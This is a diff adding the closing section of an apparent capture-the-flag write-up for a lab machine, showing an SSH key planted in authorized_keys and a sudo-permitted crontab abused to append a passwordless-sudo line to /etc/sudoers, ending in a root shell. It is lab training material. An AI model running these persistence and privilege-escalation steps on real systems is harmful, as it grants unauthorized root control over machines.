@@ -261,3 +261,40 @@ jeff@tryharder:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqs85VzmP9T/J
 jeff@tryharder:~/.ssh$ cat auth
 cat authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqs85VzmP9T/JRNSOv9D0N7EwJHLjQqq+KluZ+jnECjyVDPAnbaJaJNEuz+6/fnKU1ThYnAqbP3Asuyiob9LJVg4hhjO1IMqXJlZ97tDe6AM79zkVlpjSgydBTC9Mpqpk6F5Xq/xoYOlBHZ5lFXcT6yB/EnBC6pdKW9xuoDPDD7/Z62IUfsRZ0W/jAKLzoWV8hNi0ZEJm5lahJ6sRxydcauMyMRGmlyjth/MW2fr6VfsZQ6FM5QBFwYYPsyVyc065UQV02NNtXeZhNcOI8QjTB3gIzdi91+P97eRRlpv4sHq/geOYEuSyzm9mkb3OHN7n/M7u+j5XupRHRHfDRdg0X8Dj/niXu8v4WSmAschDYWX2PydNfDz2YBrQy4eFDg4RHG0peJu0dTqDIntA4s98cfnAm/yeEjBEi4AeC8WSH1DZJ3Xrg019gDIhyOh8BGgZmC3DyiRvgE1j92GcM2ivU0zq+CGmCvzLry9eYf1+KoXPuSnYNGr2TPONyJ+jl4bk= root@LAPTOP-U5913CMD
+
+Or to get a stable shell we can make the use of -t extension in ssh command.
+
+ssh jeff@jeff.thm -t "bash --noprofile"
+
+jeff@tryharder:~$ sudo -l
+[sudo] password for jeff:
+Matching Defaults entries for jeff on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jeff may run the following commands on tryharder:
+    (ALL) /usr/bin/crontab
+
+Edit the crontab using the following command:
+sudo /usr/bin/crontab -e 
+And paste the following
+
+*/1 * * * * echo "jeff ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+Wait for it to run and check sudo -l
+
+jeff@tryharder:~$ sudo -l
+Matching Defaults entries for jeff on tryharder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jeff may run the following commands on tryharder:
+    (ALL) /usr/bin/crontab
+    (ALL) NOPASSWD: ALL
+
+Cool it works.
+
+jeff@tryharder:~$ sudo bash
+root@tryharder:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Thank you.. Happy Hacking :)
+
